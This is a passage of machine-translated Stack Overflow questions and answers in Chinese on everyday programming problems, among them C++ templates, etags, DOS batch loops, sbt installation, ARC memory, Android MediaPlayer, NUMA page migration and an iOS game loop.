            cout << "Printing Normal" << endl;
            }
    };

void MyVector<double>::Print()
    {
    cout << "Printing Double" << endl;
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T00:48:20.603

`MyVector`需要2个模板参数，例如

```
void MyVector<double, 16>::Print()
    {
    cout << "Printing Double" << endl;
    } 
```

否则您需要为第二个模板参数提供默认值：

```
template <typename classType, int size = 16>
class MyVector
... 
```

# emacs - 如何使用 etags 跳转到 C++ 函数的声明？

> ID：10989141
> 
> 赞同：2
> 
> 时间：2012-06-12T00:25:10.447
> 
> 标签：emacs, etag

我用 etags 生成了一个 TAGS 文件，包括我正在使用的库目录中的几个目录。该命令类似于：

```
etags *.h *.cpp /path/to/library/include/* /path/to/library/libsrc/*.cpp 
```

当我调用 emacs 的 find-tag 函数`M-.`时，我永远不会从`.h`文件中获得与标签匹配的内容。

如何从某些代码中的使用跳转到函数的**声明？**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2017-02-09T16:09:08.180

这有点晚了，但是在构建 etag 时默认不包括函数声明。添加`--c++kinds=+p`以包括它们：

```
etags --c++kinds=+p *.h *.cpp /path/to/library/include/* /path/to/library/libsrc/*.cpp 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-04T19:16:05.197

默认情况下，`M-.`跳转到定义。我发现`C-u M-.`在跳转到定义后添加前缀 () 通常会转到声明。

# loops - DOS 批处理 - 打印文件名（不包括某些扩展名）

> ID：10989147
> 
> 赞同：1
> 
> 时间：2012-06-12T00:26:42.373
> 
> 标签：loops, filenames, dos

问题是关于实际的 DOS 批处理文件，而不是 Windows`cmd.exe`脚本文件。

如何在`for`循环中排除具有特定扩展名的文件？

```
@echo off

set myExtension=

for /r C:\ %%i in (*) do (
    ::notDesirableExtension
    if myExtension != gif or jpg
        ...
    echo myFiles >> F:\list.txt
) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T22:22:42.303

由于您可以访问 FOR /R，这意味着您可以访问命令扩展。所以答案是微不足道的。

```
@echo off
for /r C:\ %%i in (*) do (
  if "%%~xi" neq ".jpg" if "%%~xi" neq ".gif" >>F:\list.txt echo %%i
) 
```

但是根本没有理由使用 FOR 循环，因为您还应该可以访问 FINDSTR。这个 FINDSTR 解决方案应该快得多。并且不需要批处理文件。它在命令行上工作得很好。

```
dir /s /b /a-d-h-s | findstr /live ".jpg .gif" >F:\list.txt 
```

直到 Windows 2000 才引入命令扩展，这不是真正的 DOS。

# c++ - 如何在 C++ 中为实例化的模板类编写标头？

> ID：10989152
> 
> 赞同：3
> 
> 时间：2012-06-12T00:27:22.307
> 
> 标签：c++, templates, header-files, instantiation

我想创建一个模板类（我们称之为`Foo`），它只接受一些特定的类型参数（我们只说`double`and `float`）。通常模板在头文件 ( `.h`) 中实现，因为它不知道如何在用户代码中实例化。在这种情况下，在实现文件 ( ) 中实现类更有意义，`.cpp`如下所示：

```
// Foo.cpp:

template <class T>
class Foo
{
    // Insert members here
};

typedef Foo<double> Foo_d;
typedef Foo<float> Foo_f; 
```

这将在编译 Foo.cpp 时实例化并编译该类。但是，如何在头文件中声明它而不为`Foo_d`and编写单独的声明`Foo_f`？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T01:07:42.460

您可以在头文件中定义模板，声明方法，但不定义它们。例如：

```
template <typename T>
class Foo {
    T val;
public:
    Foo (T t);
    T value ();
};

typedef Foo<double> Foo_d;
typedef Foo<float> Foo_f; 
```

在该`.cpp`文件中，您完成方法的实现，然后实例化您想要的模板。

```
#include "foo_template.hpp"

template <typename T>
Foo<T>::Foo (T t) : val(t) {}

template <typename T>
T Foo<T>::value () { return val; }

template class Foo<double>;
template class Foo<float>; 
```

目标文件应该具有模板的*显式实例*`Foo_d`化和`Foo_f`来自模板的实例化。用于模板的任何其他类型都将导致链接错误，因为它们的实例化将不存在。或者，更迂腐的是，编译器像往常一样按需创建实例化，但它无法解析对应于类方法的符号，因为这些符号的显式实例化不存在。*`Foo``Foo`*

 ** * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-12T00:45:24.963

除非我弄错了，否则您所描述的正是新 C++11`extern template`功能的用例。要使用此功能，您可以将模板类的接口放在头文件中。然后，您将使用以下几行结束头文件：

```
extern template class Foo<float>;
extern template class Foo<double>; 
```

这告诉任何包含头文件的文件在使用它时不要尝试实例化模板。然后，在您的 C++ 文件中，您将实现模板类，然后以行结束

```
template class Foo<float>;
template class Foo<double>; 
```

最后两行强制编译器在这个翻译单元中实例化模板，所以你不会得到任何链接器错误。

希望这可以帮助！*

# scala - 无法在 Ubuntu 10.04LTS 上安装新的 0.11.3 sbt

> ID：10989157
> 
> 赞同：7
> 
> 时间：2012-06-12T00:28:18.003
> 
> 标签：scala, sbt, ubuntu-10.04

这个过程过去在 0.11.2 中运行良好，但最近对 sbt 组 ID 的更改更改为 org.scala-sbt（来自 org.scala-tools.sbt）似乎打破了依赖关系。

我有一台 10.04 LTS 机器，我使用 deb 包文件向其中添加了 Typesafe deb 存储库，如下所述：[https](https://github.com/harrah/xsbt/wiki/Getting-Started-Setup) ://github.com/harrah/xsbt/wiki/Getting-Started-Setup 。

当我尝试从 repo 安装时，我得到：

```
[warn] ::::::::::::::::::::::::::::::::::::::::::::::
[warn] :: UNRESOLVED DEPENDENCIES ::
[warn] ::::::::::::::::::::::::::::::::::::::::::::::
[warn] :: org.scala-tools.sbt#scripted-plugin_2.9.1;0.11.3: not found
[warn] ::::::::::::::::::::::::::::::::::::::::::::::

[warn] module not found: org.scala-tools.sbt#scripted-plugin_2.9.1;0.11.3
[warn] ==== typesafe-ivy-releases: tried
[warn] http://repo.typesafe.com/typesafe/ivy-releases/org.scala-tools.sbt/scripted-plugin_2.9.1/0.11.3/ivys/ivy.xml
[warn] ==== local: tried
[warn] /home/jasonmaclulich/.ivy2/local/org.scala-tools.sbt/scripted-plugin_2.9.1/0.11.3/ivys/ivy.xml
[warn] ==== Typesafe Repo: tried
[warn] http://repo.typesafe.com/typesafe/ivy-releases/org.scala-tools.sbt/scripted- plugin_2.9.1/0.11.3/ivys/ivy.xml
[warn] ==== public: tried
[warn] http://repo1.maven.org/maven2/org/scala-tools/sbt/scripted-plugin_2.9.1/0.11.3/scripted-plugin_2.9.1-0.11.3.pom 
```

如何指示 sbt 在正确的组 id 处查找脚本插件？

我还尝试使用此启动器进行手动安装（遵循 UNIX 安装说明）：

//typesafe.artifactoryonline.com/typesafe/ivy-releases/org.scala-sbt/sbt-launch/0.11.3-2/sbt-launch.jar

而且我仍然得到以下未解决的依赖项：

```
[warn] ::::::::::::::::::::::::::::::::::::::::::::::
[warn] :: UNRESOLVED DEPENDENCIES ::
[warn] ::::::::::::::::::::::::::::::::::::::::::::::
[warn] :: org.scala-tools.sbt#scripted-plugin_2.9.1;0.11.3: not found
[warn] :::::::::::::::::::::::::::::::::::::::::::::: 
```

想法？

谢谢，杰森。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-14T07:13:43.910

如果我在我的 project/build.properties 文件中将 sbt 的版本明确设置为 0.11.2，我想我会用我的解决方法来更新它，即`sbt.version=0.11.2`.

```
Detected sbt version 0.11.2
Cannot find sbt launcher 0.11.2
Please download: 
  From  http://typesafe.artifactoryonline.com/typesafe/ivy-releases/org.scala-tools.sbt/sbt-launch/0.11.2/sbt-launch.jar
     To  /home/<username>/.sbt/.lib/0.11.2/sbt-launch.jar 
```

然后我安装了所需的文件，并且能够像以前一样继续编译。

虽然这不是一个直接的解决方案，但它确实让我继续工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T00:50:36.710

By now, sbt-0.11.3-build-0100 is available (http://apt.typesafe.com/pool/pool/main/s/sbt/), so you should be able to simply upgrade to solve your problem. If that doesn't work or if you're curious about the original problem, here's my diagnosis.

As you tried to do, you do need to use a new launcher for SBT 0.11.3 to use the new group ID, `org.scala-sbt`. Your second error message still shows a failure which refers to `org.scala-tools.sbt` - that's bad, and suggests you're in fact still using the old launcher.

Could you make sure that when you're launching `sbt`, you're launching the script you created and not the one from the Debian package? Please try using the full path for launching sbt, for instance `~/bin/sbt`.

If that helps, you should fix the PATH so that `~/bin` (or wherever you installed your script) comes before the directory where the system SBT is installed, which (I would say, but it's a matter of opinion) is generally useful.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T04:18:14.550

我已经在 Ubuntu 上成功安装了最新的 SBT，但间接地，通过安装 Typesafe Stack。

# javascript - javascript替换子不起作用

> ID：10989158
> 
> 赞同：2
> 
> 时间：2012-06-12T00:28:41.560
> 
> 标签：javascript

我知道这是一个简单的概念，但我似乎无法让它发挥作用。任何想法为什么？这是我的代码：

```
var oldChild = document.getElementById("sbX1");
var newChild = document.createElement("div");
newChild.id= "sbYY1";
oldChild.replaceChild(newChild, oldChild); 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-12T00:30:23.457

当您应该在的父节点上调用它时，`replaceChild()`您正在调用`oldchild``oldchild`

```
var oldChild = document.getElementById("sbX1");
var newChild = document.createElement("div");
newChild.id= "sbYY1";

// Replace oldchild on the parent node
// You can reference the child's parent via .parentNode
// or retrieve it directly with document.getElementById('theparentId')
oldchild.parentNode.replaceChild(newChild, oldChild); 
```

# image - Drupal 7 Feeds 抓取标签内的图像

> ID：10989162
> 
> 赞同：2
> 
> 时间：2012-06-12T00:28:53.057
> 
> 标签：image, drupal, drupal-7, feed

我有以下格式的提要链接

```
<item>
<title>Lorum ipsum</title>
<teaser>Lorum ipsum</teaser>
<description>Lorum ipsum</description>
<link>http://www.example.com/article/?ad=1</link>
<image>http://www.example.com/image/123456/248x500?.cached</image>
<author>noreply@example.com</author>
<pubDate>Wed, 2 May 2012 14:22:24 +0200</pubDate>
<guid isPermaLink="false">http://www.example.comARTICLE12345678</guid>
</item> 
```

我试图将标签内的图像抓取到 Drupal 中的一个单独字段，但到目前为止没有任何效果。尝试了许多教程，但除了图像，一切都被保存了。

有什么解决办法？非常感谢

萨蒂什

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T09:06:13.307

如果您使用自定义 PHP 代码生成此提要，则可以将图像嵌入`description`标签内。

```
$description = "Lorum ipsum" . "<br />";
$description .= check_plain("<img alt='' src='PATH_TO_IMAGE' />"); 
```

希望这会有所帮助……穆罕默德。

# objective-c - ARC 占用大量内存

> ID：10989164
> 
> 赞同：2
> 
> 时间：2012-06-12T00:29:39.493
> 
> 标签：objective-c, memory-management, automatic-ref-counting, autorelease

我正在开发的应用程序使用 ARC。我希望它处理大文件，所以我不是加载整个文件，而是使用 NSFileHandle readDataOfLength 方法加载数据块。它发生在一个循环中，该循环重复直到处理整个文件：

```
- (NSString*)doStuff { // called with NSInvocationOperation

    // now we open the file itself

    NSFileHandle *fileHandle =
    [NSFileHandle fileHandleForReadingFromURL:self.path
                                        error:nil];

    ...

    BOOL done = NO;
    while(!done) {

        NSData *fileData = [fileHandle readDataOfLength: CHUNK_SIZE];

        ...

        if ( [fileData length] == 0 ) done = YES;

        ...

    }

    ...

} 
```

根据分析器，没有内存泄漏；但是，我的应用程序在处理文件时会占用大量内存。我的猜测——自动释放只有在我处理完文件之后才会出现。我可以在不切换到手动内存管理的情况下修复它吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-12T00:47:48.017

使用自动释放池将代码包装在该循环中。

```
while(!done) 
{
    @autoreleasepool
    {
        NSData *fileData = [fileHandle readDataOfLength: CHUNK_SIZE];
        ...
        if ( [fileData length] == 0 ) 
        {
            done = YES;
        }
        ...                
    }
}; 
```

`readDataOfLength`重新调整自动释放的数据，并且由于您坚持该循环及其方法，因此该自动释放的数据在您的循环和封装方法完成之前不会被释放。

# events - 如何处理禁用的 TextBox 上的 setText("Some Text") 事件

> ID：10989167
> 
> 赞同：0
> 
> 时间：2012-06-12T00:29:55.247
> 
> 标签：events, gwt, textbox

我想在 TextBox 中设置值时触发一个事件`setText("something")`

到目前为止我尝试了什么

```
w.addChangeHandler(new ChangeHandler() {            
    @Override
    public void onChange(ChangeEvent event) {
    isChanged = true;
}
}); 
```

我还尝试了一个自定义的 TextBox 来监听过去的事件

```
class CustomTextBox extends TextBox implements HasHandlers {

 private HandlerManager handlerManager;

 public CustomTextBox() {
     super();        
     handlerManager = new HandlerManager(this);  
     sinkEvents(Event.ONPASTE);      
 }

 @Override
 public void onBrowserEvent(Event event) {
   super.onBrowserEvent(event);

   switch (event.getTypeInt()) {
     case Event.ONPASTE:{
      fireEvent(new TextChangeEvent());
       break;
     }
     default:
       // Do nothing
   }
 }

 @Override
 public void fireEvent(GwtEvent<?> event) {
   handlerManager.fireEvent(event);
 }

 public HandlerRegistration addTextChangeEventHandler(TextChangeEventHandler handler) {
   return handlerManager.addHandler(TextChangeEvent.TYPE, handler);
 }
} 
```

如果没有成功，任何建议将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T10:42:20.797

`setText`不会触发事件。

将 a 添加`ValueChangeHandler<String>`到您的`TextBox`，然后用于在设置新值时向所有处理程序`setValue("something", true)`触发 a `ValueChangeEvent<String>`，无论框 id 是否禁用。

# android - 使用 MediaPlayer 服务播放下载的文件，Android

> ID：10989168
> 
> 赞同：1
> 
> 时间：2012-06-12T00:30:00.283
> 
> 标签：android, service, media-player

所以我正在为我的移动编程课程创建一个应用程序，但我在它的“播放”部分遇到了困难。给你一些背景信息：基本上我们需要创建一个基本的音频播放器，它从预定义的源下载 mp3，然后播放该 mp3，等等。我已经正确设置了下载服务，但我很困惑为什么我播放文件的代码不起作用。在我的 main.java 中，我有很多匿名用户。UI 按钮的 onclick 侦听器，然后在我的媒体播放器服务中使用 switch 语句来确定单击了哪个按钮。

这是我的主要活动中播放选项的 onclick：

```
play.setOnClickListener(new OnClickListener() {

        public void onClick(View v) {
            Intent intent = new Intent(getApplicationContext(), PlayService.class);
            File path = getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS);
            File file = new File(path, "Bob_Marley-Jammin.mp3");
            intent.putExtra("path", file);
            intent.putExtra("key", 0);
            startService(intent);               
        }
    }); 
```

这是点击下载：

```
 download.setOnClickListener(new OnClickListener() {
        public void onClick(View v) {
            Intent intent = new Intent(getApplicationContext(), DownloadService.class);
            intent.putExtra("url", "https://dl.dropbox.com/s/6e6pn43916nl10i/Bob_Marley-Jammin.mp3?dl=1");
            startService(intent);               
        }
    }); 
```

这是我的 PlayService：

```
package com.connor.black;

import java.io.IOException;

import android.app.IntentService;
import android.content.Intent;
import android.media.MediaPlayer;

public class PlayService extends IntentService{

public PlayService() {
    super("PlayService");
}

public MediaPlayer mMediaPlayer;
public String path;

@Override
protected void onHandleIntent(Intent intent) {
    path = intent.getStringExtra(path);
    int key = intent.getIntExtra("key", 0);
    mMediaPlayer = new MediaPlayer();

    switch (key) {
    case 0: //Play
        if (mMediaPlayer.isPlaying())
            break;
        else{
            try {
                mMediaPlayer.setDataSource(path);
            } catch (IllegalArgumentException e1) {
                e1.printStackTrace();
            } catch (SecurityException e1) {
                e1.printStackTrace();
            } catch (IllegalStateException e1) {
                e1.printStackTrace();
            } catch (IOException e1) {
                e1.printStackTrace();
            }
            try {
                mMediaPlayer.prepare();
            } catch (IllegalStateException e1) {
                e1.printStackTrace();
            } catch (IOException e1) {
                e1.printStackTrace();
            }
                mMediaPlayer.start();
        }
        break;
    case 1: //Pause
        if(mMediaPlayer.isPlaying())
            mMediaPlayer.pause();
        break;
    case 2: //Stop
        if(mMediaPlayer.isPlaying()){
            mMediaPlayer.pause();
            mMediaPlayer.seekTo(0);
        }
        break;
    default:
        break;
    }

}

} 
```

基本上文件下载正确但是当我按下“播放”按钮时没有任何反应。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T01:26:31.670

你的函数被调用了吗？使用 Log.d 进行检查。您的 mp3 路径是否正确？

以下小片段播放 MP3（更改文件的路径）

```
package com.aplayer;

import android.app.Activity;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Bundle;

public class APlayerActivity extends Activity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        MediaPlayer mMediaPlayer = new MediaPlayer();

        Uri data;
        data = Uri.parse("/sdcard/jazz.mp3");

        mMediaPlayer = MediaPlayer.create(getBaseContext(), data);
        mMediaPlayer.setLooping(false); // Set looping
        mMediaPlayer.start();
} 
```

}

# linux - NUMA 内存页迁移开销

> ID：10989169
> 
> 赞同：6
> 
> 时间：2012-06-12T00:30:21.580
> 
> 标签：linux, linux-kernel, administration, numa

我必须找到与Linux 下的*NUMA 内存页面迁移相关的开销。*

你能告诉我我可以使用哪些工具吗？

如果可能的话，你能举个例子。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-22T01:09:13.120

如果您想了解您的系统是否进行了过多的远程节点内存访问并且您正在使用英特尔 CPU，[英特尔的 PMU](http://software.intel.com/en-us/forums/showthread.php?t=77351)有一个实用程序调用`vtbwrun`来报告 QPI/非核心活动。

如果您想查看执行页面迁移需要多长时间，您可以测量调用的持续时间`numa_move_pages`（由`numactl`包提供）。

这是[一个例子](http://numactl.sourcearchive.com/documentation/2.0.2/migrate__pages_8c-source.html)：

```
/*
 * Test program to test the moving of a processes pages.
 *
 * (C) 2006 Silicon Graphics, Inc.
 *          Christoph Lameter <clameter@sgi.com>
 */
#include <stdio.h>
#include <stdlib.h>
#include "../numa.h"
#include <unistd.h>
#include <errno.h>

unsigned int pagesize;
unsigned int page_count = 32;

char *page_base;
char *pages;

void **addr;
int *status;
int *nodes;
int errors;
int nr_nodes;

struct bitmask *old_nodes;
struct bitmask *new_nodes;

int main(int argc, char **argv)
{
      int i, rc;

      pagesize = getpagesize();

      nr_nodes = numa_max_node()+1;

      old_nodes = numa_bitmask_alloc(nr_nodes);
        new_nodes = numa_bitmask_alloc(nr_nodes);
        numa_bitmask_setbit(old_nodes, 1);
        numa_bitmask_setbit(new_nodes, 0);

      if (nr_nodes < 2) {
            printf("A minimum of 2 nodes is required for this test.\n");
            exit(1);
      }

      setbuf(stdout, NULL);
      printf("migrate_pages() test ......\n");
      if (argc > 1)
            sscanf(argv[1], "%d", &page_count);

      page_base = malloc((pagesize + 1) * page_count);
      addr = malloc(sizeof(char *) * page_count);
      status = malloc(sizeof(int *) * page_count);
      nodes = malloc(sizeof(int *) * page_count);
      if (!page_base || !addr || !status || !nodes) {
            printf("Unable to allocate memory\n");
            exit(1);
      }

      pages = (void *) ((((long)page_base) & ~((long)(pagesize - 1))) + pagesize);

      for (i = 0; i < page_count; i++) {
            if (i != 2)
                  /* We leave page 2 unallocated */
                  pages[ i * pagesize ] = (char) i;
            addr[i] = pages + i * pagesize;
            nodes[i] = 1;
            status[i] = -123;
      }

      /* Move to starting node */
      rc = numa_move_pages(0, page_count, addr, nodes, status, 0);
      if (rc < 0 && errno != ENOENT) {
            perror("move_pages");
            exit(1);
      }

      /* Verify correct startup locations */
      printf("Page location at the beginning of the test\n");
      printf("------------------------------------------\n");

      numa_move_pages(0, page_count, addr, NULL, status, 0);
      for (i = 0; i < page_count; i++) {
            printf("Page %d vaddr=%p node=%d\n", i, pages + i * pagesize, status[i]);
            if (i != 2 && status[i] != 1) {
                  printf("Bad page state before migrate_pages. Page %d status %d\n",i, status[i]);
                  exit(1);
            }
      }

      /* Move to node zero */
      numa_move_pages(0, page_count, addr, nodes, status, 0);

      printf("\nMigrating the current processes pages ...\n");
      rc = numa_migrate_pages(0, old_nodes, new_nodes);

      if (rc < 0) {
            perror("numa_migrate_pages failed");
            errors++;
      }

      /* Get page state after migration */
      numa_move_pages(0, page_count, addr, NULL, status, 0);
      for (i = 0; i < page_count; i++) {
            printf("Page %d vaddr=%lx node=%d\n", i,
                  (unsigned long)(pages + i * pagesize), status[i]);
            if (i != 2) {
                  if (pages[ i* pagesize ] != (char) i) {
                        printf("*** Page contents corrupted.\n");
                        errors++;
                  } else if (status[i]) {
                        printf("*** Page on the wrong node\n");
                        errors++;
                  }
            }
      }

      if (!errors)
            printf("Test successful.\n");
      else
            printf("%d errors.\n", errors);

      return errors > 0 ? 1 : 0;
} 
```

# perl - 为返回 Struct 的 ListBox 调用 Win32::API SendMessage

> ID：10989173
> 
> 赞同：0
> 
> 时间：2012-06-12T00:30:32.050
> 
> 标签：perl, winapi, sendmessage

我在 Windows 应用程序中有一个 ListBox，它列出了聊天会话中的人员。这定义如下：

```
Win32::API::Struct->typedef('UserItem', qw {
                                                USHORT uid;
                                                TCHAR realName[256];
                                                TCHAR aliasName[256];
                                            }
                       ) or die "Typedef error $! \n";

my $user_data = Win32::API::Struct->new('UserItem'); 
```

现在我想向窗口发送一条 LB_GETITEMDATA 消息，以获取结构定义的与会者项目详细信息。

使用 Win32::API，我这样做：

```
my $LB_GETITEMDATA = 0x0199;
my $SendMessage = Win32::API->new("user32", "SendMessage", "NNNN", "S");
... # Here is the code to find the window handle, which is $hwnd.
$user_data = $SendMessage->Call($hwnd, $LB_GETITEMDATA, 0, 0); # Get the first item. 
```

现在，我认为 $user_data 结构将包含第一项的详细信息，但它实际上是 undef 并且我也没有得到任何 LB_ERR。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T04:02:30.083

这对我来说毫无意义。如果你不告诉它，Win32::API 怎么知道 SendMessage 正在返回什么样的结构？它不可能根据您提供的信息创建正确类型的对象。

我看不到如何使用“S”作为返回值。我认为如果您想将返回值解压缩到 ::Struct 对象中，您可能必须使用原型接口。那是唯一一个记录在案的。

但在你开始搞砸之前，将返回类型更改为“N”，看看你是否得到一个指针。如果您得到零，则可能是列表框或参数（特别是句柄或消息编号，因为“NNNN”在我看来是正确的）有问题，您应该先解决这个问题。然后，如果仍然有问题，您可以担心返回值。

如果使 ::Struct 工作有问题，您总是可以自己解压缩结构。

```
 # Use "N" for return.
 my ($uid, $realName, $aliasName) =
    unpack('S Z256 Z256',                # Unpack fields of structure.
       unpack('P514', pack('J', $rv)));  # Get bytes of the structure. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T00:36:50.893

添加字符串后，您必须使用 LB_SETITEMDATA 设置项目数据。数据只是一个指针大小的值，因此只要项目存在于列表中，每个 $user_data 结构就必须存在于内存中......

# iphone - 切换视图时如何打破 for 循环？

> ID：10989178
> 
> 赞同：0
> 
> 时间：2012-06-12T00:31:42.927
> 
> 标签：iphone, audio, ios5, for-loop, break

我需要帮助我正在编写一个简单的比赛游戏。我的问题是，当我从游戏视图切换到主菜单视图时，游戏一直在播放，直到在后台运行一个循环完成，该循环点亮一个按钮并按顺序取消点亮它们我仍然可以听到它在按下按钮时发出的声音当我切换视图时，灯光在后台播放。当我按下“主菜单”按钮时，我尝试在循环中添加一个中断，但它不起作用，我将按钮标记为“100”。以下是我编写的相关代码，请记住我仍然是新手，所以任何建议将不胜感激！先感谢您！

```
- (IBAction)newGame:(id)sender
{
//creat random array of buttons
[self randomArray];

//initialize button pushed array
buttonPushedArray = [[NSMutableArray alloc] initWithArray:NULL];

//initialize points
points = [[NSNumber alloc] initWithInt: 30];

//Initialize label to show score
scoreView.text = [NSString stringWithFormat:@"%@", score];

//Initialize label to show level
levelView.text = [NSString stringWithFormat:@"%@", levelNum];

//button pushed
//int a = [sender tag];

//loop through each button in array and turn them on and off
for (NSString *i in gameArray) 
{
    if ([sender tag] > 99) 
    { 
        break;
    }else 
    {
    int butNum = [i intValue];
    delay2 = [delay intValue];

    NSNumber *number = [[NSNumber alloc] initWithInt:butNum];

    //turn button on
    [self buttonLit:(NSNumber*)number];

    //turn button off
    [self performSelector:@selector(buttonUnLit:) withObject:number afterDelay:delay2];

    //time delay that give 'turn button off' command enough time to respond
    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: delay2]];

    [number release];
    }
 }    

}

 - (void)randomArray
 {
//initialize array
gameArray = [[NSMutableArray alloc] initWithArray:NULL];

int level = [levelNum intValue];

//************* Build random array of numbers *******************
for (int i = 0; i < level; i++) 
{
    //generate a number from 0 to 11 at random
    NSInteger num = (arc4random() % 11);

    //add number to array
    [gameArray addObject:[NSString stringWithFormat:@"%i", num]];
}
return;

}

- (void)buttonLit:(NSNumber*)number
{
int numLitInt = [number intValue];

if (numLitInt == 0) 
{
    //light up the button
    [button0 setImage:[UIImage imageNamed:@"0(lite).png"] forState:UIControlStateNormal];

    //*********** play audio file ****************
    NSString* resourcePath = [[NSBundle mainBundle] resourcePath];
    resourcePath = [resourcePath stringByAppendingString:@"/ding1.m4a"];
    NSError* err;

    //Initialize our player pointing to the path to our resource
    player = [[AVAudioPlayer alloc] initWithContentsOfURL:
              [NSURL fileURLWithPath:resourcePath] error:&err];

    if( err ){
        //bail!
        NSLog(@"Failed with reason: %@", [err localizedDescription]);
    }
    else{
        //set our delegate and begin playback
        [player play];
    }
    return;
}else if (numLitInt == 1)
{
    //light up the button
    [button1 setImage:[UIImage imageNamed:@"1(lite).png"] forState:UIControlStateNormal];

    //*********** play audio file ****************
    NSString* resourcePath = [[NSBundle mainBundle] resourcePath];
    resourcePath = [resourcePath stringByAppendingString:@"/ding2.m4a"];
    NSError* err;

    //Initialize our player pointing to the path to our resource
    player = [[AVAudioPlayer alloc] initWithContentsOfURL:
              [NSURL fileURLWithPath:resourcePath] error:&err];

    if( err ){
        //bail!
        NSLog(@"Failed with reason: %@", [err localizedDescription]);
    }
    else{
        //set our delegate and begin playback
        [player play];
    }
    return;
}else if (numLitInt == 2)
{
    //light up the button
    [button2 setImage:[UIImage imageNamed:@"2(lite).png"] forState:UIControlStateNormal];

    //*********** play audio file ****************
    NSString* resourcePath = [[NSBundle mainBundle] resourcePath];
    resourcePath = [resourcePath stringByAppendingString:@"/ding3.m4a"];
    NSError* err;

    //Initialize our player pointing to the path to our resource
    player = [[AVAudioPlayer alloc] initWithContentsOfURL:
              [NSURL fileURLWithPath:resourcePath] error:&err];

    if( err ){
        //bail!
        NSLog(@"Failed with reason: %@", [err localizedDescription]);
    }
    else{
        //set our delegate and begin playback
        [player play];
    }
    return;
}else if (numLitInt == 3)
{
    //light up the button
    [button3 setImage:[UIImage imageNamed:@"3(lite).png"] forState:UIControlStateNormal];

    //*********** play audio file ****************
    NSString* resourcePath = [[NSBundle mainBundle] resourcePath];
    resourcePath = [resourcePath stringByAppendingString:@"/ding4.m4a"];
    NSError* err;

    //Initialize our player pointing to the path to our resource
    player = [[AVAudioPlayer alloc] initWithContentsOfURL:
              [NSURL fileURLWithPath:resourcePath] error:&err];

    if( err ){
        //bail!
        NSLog(@"Failed with reason: %@", [err localizedDescription]);
    }
    else{
        //set our delegate and begin playback
        [player play];
    }
    return;
}else if (numLitInt == 4)
{
    //light up the button
    [button4 setImage:[UIImage imageNamed:@"4(lite).png"] forState:UIControlStateNormal];

    //*********** play audio file ****************
    NSString* resourcePath = [[NSBundle mainBundle] resourcePath];
    resourcePath = [resourcePath stringByAppendingString:@"/ding1.m4a"];
    NSError* err;

    //Initialize our player pointing to the path to our resource
    player = [[AVAudioPlayer alloc] initWithContentsOfURL:
              [NSURL fileURLWithPath:resourcePath] error:&err];

    if( err ){
        //bail!
        NSLog(@"Failed with reason: %@", [err localizedDescription]);
    }
    else{
        //set our delegate and begin playback
        [player play];
    }
    return;
}else if (numLitInt == 5)
{
    //light up the button
    [button5 setImage:[UIImage imageNamed:@"5(lite).png"] forState:UIControlStateNormal];

    //*********** play audio file ****************
    NSString* resourcePath = [[NSBundle mainBundle] resourcePath];
    resourcePath = [resourcePath stringByAppendingString:@"/ding2.m4a"];
    NSError* err;

    //Initialize our player pointing to the path to our resource
    player = [[AVAudioPlayer alloc] initWithContentsOfURL:
              [NSURL fileURLWithPath:resourcePath] error:&err];

    if( err ){
        //bail!
        NSLog(@"Failed with reason: %@", [err localizedDescription]);
    }
    else{
        //set our delegate and begin playback
        [player play];
    }
    return;
}else if (numLitInt == 6)
{
    //light up the button
    [button6 setImage:[UIImage imageNamed:@"6(lite).png"] forState:UIControlStateNormal];

    //*********** play audio file ****************
    NSString* resourcePath = [[NSBundle mainBundle] resourcePath];
    resourcePath = [resourcePath stringByAppendingString:@"/ding3.m4a"];
    NSError* err;

    //Initialize our player pointing to the path to our resource
    player = [[AVAudioPlayer alloc] initWithContentsOfURL:
              [NSURL fileURLWithPath:resourcePath] error:&err];

    if( err ){
        //bail!
        NSLog(@"Failed with reason: %@", [err localizedDescription]);
    }
    else{
        //set our delegate and begin playback
        [player play];
    }
    return;
}else if (numLitInt == 7)
{
    //light up the button
    [button7 setImage:[UIImage imageNamed:@"7(lite).png"] forState:UIControlStateNormal];

    //*********** play audio file ****************
    NSString* resourcePath = [[NSBundle mainBundle] resourcePath];
    resourcePath = [resourcePath stringByAppendingString:@"/ding4.m4a"];
    NSError* err;

    //Initialize our player pointing to the path to our resource
    player = [[AVAudioPlayer alloc] initWithContentsOfURL:
              [NSURL fileURLWithPath:resourcePath] error:&err];

    if( err ){
        //bail!
        NSLog(@"Failed with reason: %@", [err localizedDescription]);
    }
    else{
        //set our delegate and begin playback
        [player play];
    }
    return;
}else if (numLitInt == 8)
{
    //light up the button
    [button8 setImage:[UIImage imageNamed:@"8(lite).png"] forState:UIControlStateNormal];

    //*********** play audio file ****************
    NSString* resourcePath = [[NSBundle mainBundle] resourcePath];
    resourcePath = [resourcePath stringByAppendingString:@"/ding1.m4a"];
    NSError* err;

    //Initialize our player pointing to the path to our resource
    player = [[AVAudioPlayer alloc] initWithContentsOfURL:
              [NSURL fileURLWithPath:resourcePath] error:&err];

    if( err ){
        //bail!
        NSLog(@"Failed with reason: %@", [err localizedDescription]);
    }
    else{
        //set our delegate and begin playback
        [player play];
